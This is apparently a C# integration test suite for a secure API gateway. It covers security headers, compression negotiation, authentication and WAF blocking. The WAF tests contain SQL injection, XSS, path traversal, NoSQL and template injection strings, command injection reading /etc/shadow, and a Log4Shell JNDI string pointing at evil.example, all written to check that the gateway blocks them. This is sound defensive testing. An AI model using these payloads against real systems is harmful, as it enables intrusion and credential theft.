using System.IO.Compression;
using System.Net;
using System.Net.Http.Headers;
using System.Text;
using System.Text.Json;
using Secure.Gateway.API.Tests.Infrastructure;

namespace Secure.Gateway.API.Tests;

public sealed class GatewayIntegrationTests(GatewayFixture fixture) : IClassFixture<GatewayFixture>
{
    private HttpClient Client() => fixture.Factory.CreateClient();

    // ---------------------------------------------------------------- proxying + headers

    [Fact]
    public async Task Health_IsAnonymous_AndHasSecurityHeaders()
    {
        var response = await Client().GetAsync("/health/live");

        Assert.Equal(HttpStatusCode.OK, response.StatusCode);
        Assert.Equal("nosniff", response.Headers.GetValues("X-Content-Type-Options").Single());
        Assert.Equal("DENY", response.Headers.GetValues("X-Frame-Options").Single());
        Assert.True(response.Headers.Contains("Content-Security-Policy"));
        Assert.True(response.Headers.Contains("X-Correlation-ID"));
        Assert.False(response.Headers.Contains("Server"));
    }

    [Fact]
    public async Task PublicRoute_IsProxied_AndUpstreamFingerprintHeadersAreStripped()
    {
        var response = await Client().GetAsync("/api/public/items");

        Assert.Equal(HttpStatusCode.OK, response.StatusCode);
        Assert.False(response.Headers.Contains("Server"));
        Assert.False(response.Headers.Contains("X-Powered-By"));
        Assert.False(response.Headers.Contains("X-AspNet-Version"));
        Assert.Equal("no-referrer", response.Headers.GetValues("Referrer-Policy").Single());
    }

    [Fact]
    public async Task UpstreamReceivesCorrelationId_AndNoAcceptEncoding()
    {
        var request = new HttpRequestMessage(HttpMethod.Get, "/api/public/echo");
        request.Headers.Add("X-Correlation-ID", "abc-123");
        request.Headers.AcceptEncoding.ParseAdd("gzip, br, zstd");

        var response = await Client().SendAsync(request);
        var json = await ReadJsonAsync(response);

        Assert.Equal("abc-123", response.Headers.GetValues("X-Correlation-ID").Single());
        Assert.Equal("abc-123", json.GetProperty("correlationId").GetString());
        Assert.Equal(string.Empty, json.GetProperty("acceptEncoding").GetString());
    }

    [Fact]
    public async Task InvalidCorrelationId_IsReplaced()
    {
        var request = new HttpRequestMessage(HttpMethod.Get, "/health/live");
        request.Headers.TryAddWithoutValidation("X-Correlation-ID", "bad id <script>");

        var response = await Client().SendAsync(request);

        Assert.NotEqual("bad id <script>", response.Headers.GetValues("X-Correlation-ID").Single());
    }

    // ---------------------------------------------------------------- compression

    [Theory]
    [InlineData("zstd", "zstd")]
    [InlineData("br", "br")]
    [InlineData("gzip", "gzip")]
    [InlineData("gzip, deflate, br, zstd", "zstd")]   // modern browser over HTTPS -> zstd preferred
    [InlineData("gzip, deflate, br", "br")]           // older browser -> Brotli
    [InlineData("zstd;q=0.5, br;q=1.0", "br")]        // q-values are honoured
    public async Task ResponseCompression_NegotiatesBestEncoding(string acceptEncoding, string expected)
    {
        var request = new HttpRequestMessage(HttpMethod.Get, "/api/public/items");
        request.Headers.TryAddWithoutValidation("Accept-Encoding", acceptEncoding);

        var response = await Client().SendAsync(request);

        Assert.Equal(HttpStatusCode.OK, response.StatusCode);
        Assert.Equal(expected, response.Content.Headers.ContentEncoding.Single());
        Assert.Contains("Accept-Encoding", response.Headers.Vary);

        var compressed = await response.Content.ReadAsByteArrayAsync();
        var body = Decompress(expected, compressed);
        Assert.Contains("item-199", body);
        Assert.True(compressed.Length < Encoding.UTF8.GetByteCount(body) / 3, "payload should compress well");
    }

    [Fact]
    public async Task NoAcceptEncoding_ReturnsIdentity()
    {
        var response = await Client().GetAsync("/api/public/items");
        Assert.Empty(response.Content.Headers.ContentEncoding);
    }

    // ---------------------------------------------------------------- WAF

    [Theory]
    [InlineData("/api/public/users?id=1' OR '1'='1")]
    [InlineData("/api/public/users?id=1 UNION SELECT username, password FROM users")]
    [InlineData("/api/public/users?id=1/**/UNION/**/SELECT/**/1,2")]
    [InlineData("/api/public/users?id=%2527%2520OR%25201%253D1--%2520")]       // double URL-encoded
    [InlineData("/api/public/users?id=1; DROP TABLE users")]
    [InlineData("/api/public/users?id=1 AND SLEEP(5)")]
    [InlineData("/api/public/login?user=admin'--")]
    [InlineData("/api/public/search?q=<script>alert(1)</script>")]
    [InlineData("/api/public/search?q=<img src=x onerror=alert(1)>")]
    [InlineData("/api/public/search?q=javascript:alert(document.cookie)")]
    [InlineData("/api/public/file?name=../../etc/passwd")]
    [InlineData("/api/public/ping?host=127.0.0.1 | cat /etc/shadow")]
    [InlineData("/api/public/users?user[$ne]=admin")]
    [InlineData("/api/public/tpl?name={{config.items()}}")]
    public async Task Waf_BlocksMaliciousQuery(string url)
    {
        var response = await Client().GetAsync(url);

        Assert.Equal(HttpStatusCode.Forbidden, response.StatusCode);
        Assert.Equal("application/problem+json", response.Content.Headers.ContentType?.MediaType);
        var body = await response.Content.ReadAsStringAsync();
        Assert.DoesNotContain("script", body, StringComparison.OrdinalIgnoreCase); // input never echoed
    }

    [Fact]
    public async Task Waf_BlocksLog4ShellInHeader()
    {
        var request = new HttpRequestMessage(HttpMethod.Get, "/api/public/items");
        request.Headers.TryAddWithoutValidation("User-Agent", "${jndi:ldap://evil.example/a}");

        var response = await Client().SendAsync(request);

        Assert.Equal(HttpStatusCode.Forbidden, response.StatusCode);
    }

    [Theory]
    [InlineData("""{"username":"admin","password":"' OR 1=1-- "}""")]
    [InlineData("""{"username":{"$ne":null},"password":{"$ne":null}}""")]
    [InlineData("""{"comment":"<svg onload=alert(1)>"}""")]
    [InlineData("""{"nested":{"deep":["ok","1; DELETE FROM orders"]}}""")]
    public async Task Waf_BlocksMaliciousJsonBody(string json)
    {
        var response = await Client().PostAsync("/api/public/users", new StringContent(json, Encoding.UTF8, "application/json"));
        Assert.Equal(HttpStatusCode.Forbidden, response.StatusCode);
    }

    [Fact]
    public async Task Waf_BlocksMaliciousFormBody()
    {
        var form = new FormUrlEncodedContent([new("username", "admin' OR 'x'='x"), new("password", "x")]);
        var response = await Client().PostAsync("/api/public/login", form);
        Assert.Equal(HttpStatusCode.Forbidden, response.StatusCode);
    }

    [Theory]
    [InlineData("""{"name":"O'Brien","bio":"I select the best option from the list","tags":["C#","--force"]}""")]
    [InlineData("""{"query":"price >= 10 and rating = 5","note":"Tom & Jerry; \"quoted\" text"}""")]
    [InlineData("""{"email":"jane.doe@example.com","url":"https://example.com/a?b=c&d=e","math":"1 + 1 = 2"}""")]
    public async Task Waf_AllowsLegitimateJson(string json)
    {
        var response = await Client().PostAsync("/api/public/users", new StringContent(json, Encoding.UTF8, "application/json"));
        Assert.Equal(HttpStatusCode.OK, response.StatusCode);
    }

    [Fact]
    public async Task CompressedRequestBody_IsRejected()
    {
        var content = new ByteArrayContent(Encoding.UTF8.GetBytes("{}"));
        content.Headers.ContentType = new MediaTypeHeaderValue("application/json");
        content.Headers.ContentEncoding.Add("gzip");

        var response = await Client().PostAsync("/api/public/users", content);

        Assert.Equal(HttpStatusCode.RequestEntityTooLarge, response.StatusCode);
    }

    // ---------------------------------------------------------------- request validation

    [Fact]
    public async Task TraceMethod_IsRejected()
    {
        var response = await Client().SendAsync(new HttpRequestMessage(HttpMethod.Trace, "/api/public/items"));
        Assert.Equal(HttpStatusCode.MethodNotAllowed, response.StatusCode);
        Assert.Contains("GET", response.Content.Headers.Allow);
    }

    [Fact]
    public async Task VeryLongUrl_IsRejected()
    {
        var response = await Client().GetAsync("/api/public/items?x=" + new string('a', 5000));
        Assert.Equal(HttpStatusCode.RequestUriTooLong, response.StatusCode);
    }

    [Fact]
    public async Task UnsupportedContentType_IsRejected()
    {
        var content = new StringContent("<x/>", Encoding.UTF8, "application/x-evil");
        var response = await Client().PostAsync("/api/public/items", content);
        Assert.Equal(HttpStatusCode.UnsupportedMediaType, response.StatusCode);
    }

    // ---------------------------------------------------------------- authentication

    [Fact]
    public async Task SecureRoute_WithoutCredentials_Returns401()
    {
        var response = await Client().GetAsync("/api/orders");
        Assert.Equal(HttpStatusCode.Unauthorized, response.StatusCode);
    }

    [Fact]
    public async Task SecureRoute_WithInvalidApiKey_Returns401()
    {
        var request = new HttpRequestMessage(HttpMethod.Get, "/api/orders");
        request.Headers.Add("X-API-Key", "wrong-key-0123456789abcdef");
        var response = await Client().SendAsync(request);
        Assert.Equal(HttpStatusCode.Unauthorized, response.StatusCode);
    }

    [Fact]
    public async Task SecureRoute_WithValidApiKey_ForwardsIdentity_NotTheKey()
    {
        var request = new HttpRequestMessage(HttpMethod.Get, "/api/orders");
        request.Headers.Add("X-API-Key", GatewayFactory.ApiKey);

        var response = await Client().SendAsync(request);
        var json = await ReadJsonAsync(response);

        Assert.Equal(HttpStatusCode.OK, response.StatusCode);
        Assert.Equal(GatewayFactory.ApiClientId, json.GetProperty("authenticatedClient").GetString());
        Assert.False(json.GetProperty("apiKeyForwarded").GetBoolean());
    }

    [Fact]
    public async Task SpoofedIdentityHeader_IsStripped()
    {
        var request = new HttpRequestMessage(HttpMethod.Get, "/api/public/items");
        request.Headers.Add("X-Authenticated-Client", "admin");

        var json = await ReadJsonAsync(await Client().SendAsync(request));

        Assert.Equal(string.Empty, json.GetProperty("authenticatedClient").GetString());
    }

    // ---------------------------------------------------------------- helpers

    private static async Task<JsonElement> ReadJsonAsync(HttpResponseMessage response)
    {
        var bytes = await response.Content.ReadAsByteArrayAsync();
        var encoding = response.Content.Headers.ContentEncoding.FirstOrDefault();
        var text = encoding is null ? Encoding.UTF8.GetString(bytes) : Decompress(encoding, bytes);
        return JsonDocument.Parse(text).RootElement.Clone();
    }

    internal static string Decompress(string encoding, byte[] data)
    {
        using var input = new MemoryStream(data);
        using Stream stream = encoding switch
        {
            "zstd" => new ZstdSharp.DecompressionStream(input),
            "br" => new BrotliStream(input, CompressionMode.Decompress),
            "gzip" => new GZipStream(input, CompressionMode.Decompress),
            _ => throw new NotSupportedException(encoding),
        };
        using var reader = new StreamReader(stream, Encoding.UTF8);
        return reader.ReadToEnd();
    }
}
